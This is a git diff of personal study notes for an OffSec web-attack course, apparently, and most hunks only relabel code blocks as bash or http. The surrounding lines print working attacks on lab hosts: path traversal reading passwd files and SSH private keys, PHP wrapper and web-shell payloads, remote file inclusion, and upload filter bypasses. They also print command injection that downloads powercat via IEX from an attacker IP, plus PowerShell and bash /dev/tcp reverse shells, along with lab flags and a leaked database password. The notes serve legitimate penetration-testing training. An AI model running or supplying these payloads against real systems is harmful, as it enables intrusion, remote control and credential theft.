@@ -203,7 +203,7 @@ http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../hom
 - As soon as we've identified a possible vulnerability, such as with the "page" parameter in this case, **we should not rely on a browser for testing**.
 - We should mainly use tools such as Burp, cURL, or a programming language of our choice.
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ...
 -----BEGIN OPENSSH PRIVATE KEY-----
@@ -229,7 +229,7 @@ iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
     - We'll need to modify the permissions of the `dt_key` file so that only the user `/` owner can read the file.
         - If we don't, the ssh program will throw an error stating that the access permissions are too open.
 
-```
+```bash
 kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 The authenticity of host '[mountaindesserts.com]:2222 ([192.168.50.16]:2222)' can't be established.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -273,7 +273,7 @@ kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 
 **Linux Apache PHP Path Traversal**
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../etc/passwd
 <!DOCTYPE html>
@@ -364,7 +364,7 @@ iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
 
 Save key, set perms, connect to host:
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ chmod 400 dt_rsa                                 
                                                                              
@@ -378,7 +378,7 @@ offsec
 
 **Grafana Windows Path traversal**
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
 OS{40fc8290aa5efda3d0a1c3eb5615dfac}
@@ -390,7 +390,7 @@ OS{40fc8290aa5efda3d0a1c3eb5615dfac}
 
 - In the "Vulnerability Scanning" topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache 2.4.49.1 This vulnerability can be exploited by using a relative path after specifying the cgi-bin directory in the URL.
 
-```
+```bash
 kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
 
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
@@ -424,7 +424,7 @@ kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../
     - We can leverage specific ASCII encoding lists4 to manually encode our query from listing 11 or use the online converter on the same page.
     - For now, we will only encode the dots, which are represented as `%2e`.
 
-```
+```bash
 kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
@@ -449,7 +449,7 @@ alfred:x:1000:1000::/home/alfred:/bin/bash
 
 **Apache cgi-bin path traversal with URL encoding**
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
 OS{4fc96513e5471612d0846a523a8d199e}
@@ -457,7 +457,7 @@ OS{4fc96513e5471612d0846a523a8d199e}
 
 **Grafana with URL encoding**
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
 root:x:0:0:root:/root:/bin/bash
@@ -532,7 +532,7 @@ OS{8267caf26dc5b6bb3876c10b9d8c28ef}
             - "controlled" means we can modify the data we are sending.
         - Use curl to analyze the elements that comprise a log entry.
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ...
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
@@ -843,7 +843,7 @@ OS{14b069b2a4b837e64c31d95d1da76910}
 
 **filter example**
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
 ...
 <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
@@ -862,7 +862,7 @@ Note, body is not closed!!! We can assume exec code, such as php, follows.
 
 Include with filter.
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
 ...
 <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
@@ -879,7 +879,7 @@ kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter
 
 Same result as PHP is still executing, encode to base64 string to extract.
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ...
 <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
@@ -890,7 +890,7 @@ dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRt
 
 Copy string from output and decode in terminal.
 
-```
+```bash
 kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
 <!DOCTYPE html>
 <html lang="en">
@@ -916,7 +916,7 @@ Decoded data contains MySQL conn info!!!
 
 **data example**
 
-```
+```bash
 kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
 ...
 <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
@@ -934,7 +934,7 @@ PHP snip with data wrapper shows output of `ls`.
 
 When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
 
-```
+```bash
 kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 
@@ -1084,7 +1084,7 @@ system("sudo rsync -avzR /var/www/html/index.php /mnt/external/");
 
 Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.
 
-```
+```http
 GET /meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?> HTTP/1.1
 Host: mountaindesserts.com
 Upgrade-Insecure-Requests: 1
@@ -1122,7 +1122,7 @@ Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 202
     - We will use `simple-backdoor.php`
         - Similar to snippet in last section, it accepts `cmd` param.
 
-```
+```bash
 kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
 ...
 <?php
@@ -1141,7 +1141,7 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 
 To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.
 
-```
+```bash
 kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -1150,7 +1150,7 @@ We could also use a publicly-accessible file, such as one from Github.
 
 Next, we'll use curl to include the hosted file via HTTP and specify ls as our command.
 
-```
+```bash
 kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
 ...
 <a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
@@ -1170,7 +1170,7 @@ js
 
 Follow the steps from this section to leverage RFI to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.
 
-```
+```bash
 └─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&cmd=ls"
 
 ...
@@ -1326,7 +1326,7 @@ OS{60430fabfa02aa752791194b9591be5e}
 
 "Mountain Desserts" app, the Admin link has been replaced by an upload form. The text explains that we can upload a picture to win a contest. The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack. The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system. Let's find out if we can upload a text file instead of an image.
 
-```
+```bash
 kali@kali:~$ echo "this is a test" > test.txt
 ```
 
@@ -1340,7 +1340,7 @@ Another way we can bypass the filter is by changing characters in the file exten
 
 Let's try the second method, updating our simple-backdoor.php file extension from .php to .pHP. After renaming the file either in the terminal or file explorer, we'll upload it via the web form.
 
-```
+```bash
 kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
 ...
  Directory of C:\xampp\htdocs\meteor\uploads
@@ -1356,7 +1356,7 @@ kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=d
 
 PowerShell one-liner for rev shell, use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let's create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert6 and the property Unicode from the class Encoding to encode the contents of the $Text variable.
 
-```
+```bash
 kali@kali:~$ pwsh
 PowerShell 7.1.3
 Copyright (c) Microsoft Corporation.
@@ -1382,7 +1382,7 @@ PS> exit
 
 As shown in Listing 32, the $EncodedText variable contains the encoded reverse shell one-liner. Let's use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We'll also need to use URL encoding for the spaces.
 
-```
+```bash
 kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
 ...
 AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
@@ -1390,7 +1390,7 @@ AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADs
 
 After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.
 
-```
+```bash
 kali@kali:~$ nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
@@ -1414,7 +1414,7 @@ Below shows us the frameworks and languages for which Kali already offers web sh
 
 We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.
 
-```
+```bash
 kali@kali:~$ ls -la /usr/share/webshells
 total 40
 drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
@@ -1432,7 +1432,7 @@ drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
 
 Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the C:\\xampp\\passwords.txt file as a password for the mountainadmin user.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/webshells/ps]
 └─$ cat ps-one-liner.md 
 # PowerShell Encoded One-Liner Setup
@@ -1614,7 +1614,7 @@ Hello admin team. We needed to reset all passwords to OS{daa29e627253f9e95f252e0
 
 Example site no longer uses PHP.
 
-```
+```bash
 kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
 404 page not found
 
@@ -1627,7 +1627,7 @@ kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
 
 Test file upload with `test.txt` capture in Burp.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo nano /etc/hosts
 [sudo] password for kali: 
@@ -1640,7 +1640,7 @@ Successfully Uploaded File: test.txt
 
 Capture in Burp, send to Repeater, and test.
 
-```
+```http
 POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 189
@@ -1666,7 +1666,7 @@ test
 
 Same result as browser.
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:20:27 GMT
 Content-Length: 37
@@ -1678,7 +1678,7 @@ Successfully Uploaded File: test.txt
 
 Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the "filename" parameter in the request so it contains ../../../../../../../test.txt, then click send.
 
-```
+```http
 POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 211
@@ -1704,7 +1704,7 @@ test
 
 Success.
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:24:52 GMT
 Content-Length: 58
@@ -1726,7 +1726,7 @@ When using programming languages that include their own web server, administrato
 
 Attempt to overwrite `authorized_keys` in the home of root. Create SSH keypair and authorized_keys file containing pub.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/.ssh]
 └─$ ssh-keygen 
 Generating public/private rsa key pair.
@@ -1756,7 +1756,7 @@ The key's randomart image is:
 
 Prepare the request with burp, upload authorized_keys file and capture. Send to repeater and prepare to blind overwrite.
 
-```
+```http
 POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 768
@@ -1782,7 +1782,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqr0PVNbEyQE/2ObXfuOA/R1A/MXbNLy0uu1ErLnLv
 
 Success.
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:36:31 GMT
 Content-Length: 75
@@ -1794,7 +1794,7 @@ Successfully Uploaded File: ../../../../../../../root/.ssh/authorized_keys
 
 Connect via SSH.
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ ssh -i .ssh/fileup root@mountaindesserts.com -p 2222
 The authenticity of host '[mountaindesserts.com]:2222 ([192.168.246.16]:2222)' can't be established.
@@ -1845,7 +1845,7 @@ Navigate to http://192.168.220.189:8000, the MountainVault site is desinged to c
 
 With curl;
 
-```
+```bash
 kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
 
 Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 
@@ -1853,7 +1853,7 @@ Command Injection detected. Aborting...%!(EXTRA string=ipconfig)
 
 With Burp, running `git version` we find a Win box.
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 19
@@ -1873,7 +1873,7 @@ Archive=git+version
 
 This string is included in Win builds of git when run with `version` param.
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:20:58 GMT
 Content-Length: 98
@@ -1890,7 +1890,7 @@ Now that we know it runs Win, poke around.
 - Can also delimit commands with `&` and `&&` for bash/powershell
     - NOTE Win CMD `&`
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 30
@@ -1910,7 +1910,7 @@ Archive=git+version%3Bipconfig
 
 Interesting results!
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:23:50 GMT
 Content-Length: 377
@@ -1936,7 +1936,7 @@ What we can assume, is the filter checks if `git` is executed and little else, l
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
 ```
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ urlencode '(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell'
 
@@ -1945,7 +1945,7 @@ What we can assume, is the filter checks if `git` is executed and little else, l
 
 In Burp;
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 110
@@ -1965,7 +1965,7 @@ Archive=git+version%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20r
 
 Retruns;
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:33:38 GMT
 Content-Length: 161
@@ -1979,7 +1979,7 @@ PowerShell
 
 Looks like PowerShell. Obtain a reverse shell with `powercat` , the powershell implementation of netcat included in Kali. Copy it to working dir and serve it with Python.
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
                                                                                          
@@ -1994,7 +1994,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Start the local netcat listener;
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ nc -nvlp 4444                        
 listening on [any] 4444 ...
@@ -2008,7 +2008,7 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/power
 
 URL encode as usual;
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ urlencode 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell'
 IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.223%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.223%20-p%204444%20-e%20powershell
@@ -2016,7 +2016,7 @@ IEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F1
 
 Burp req;
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 110
@@ -2036,7 +2036,7 @@ Archive=git+version%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadStri
 
 Netcat shell returned;
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ nc -nvlp 4444                        
 listening on [any] 4444 ...
@@ -2055,7 +2055,7 @@ Instead of using Powercat, we could also inject a PowerShell reverse shell direc
 
 Follow the steps above and exploit the command injection vulnerability on VM #1 to obtain a reverse shell. Since the machine is not connected to the internet, you have to skip the step of cloning the repository from the beginning of this section. Find the flag on the Desktop for the Administrator user.
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec]
 └─$ nc -nvlp 4444                        
 listening on [any] 4444 ...
@@ -2089,7 +2089,7 @@ For this exercise the Mountain Vaults application runs on Linux (VM #2). Exploit
 
 Burp captured request, sent to repeater;
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.16
 Content-Length: 19
@@ -2109,7 +2109,7 @@ Archive=git+version
 
 Returns;
 
-```
+```http
 HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 23:16:17 GMT
 Content-Length: 88
@@ -2127,7 +2127,7 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 URL encode, start listener, send request;
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ urlencode 'bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"'
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
@@ -2135,7 +2135,7 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%2
 
 Burp, add to request with `%3B` for `;`;
 
-```
+```http
 POST /archive HTTP/1.1
 Host: 192.168.220.16
 Content-Length: 19
@@ -2155,7 +2155,7 @@ Archive=git+version%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168
 
 Shell returned;
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/shells]
 └─$ nc -nvlp 4444                        
 listening on [any] 4444 ...
